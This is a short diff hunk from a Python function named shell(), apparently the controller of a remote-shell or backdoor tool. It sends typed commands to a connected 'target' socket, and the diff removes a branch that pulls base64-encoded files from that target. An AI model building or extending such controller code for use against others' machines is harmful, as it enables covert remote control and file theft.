@@ -22,11 +22,6 @@ def shell():
 
         elif comando == "":
             pass
-        elif comando[:8] == "download":
-            target.send(comando)
-            with open(comando[9:], 'wb') as file_download:
-                datos = target.recv(30000)
-                file_download.write(base64.b64decode(datos))
 
         else:
             target.send(comando)
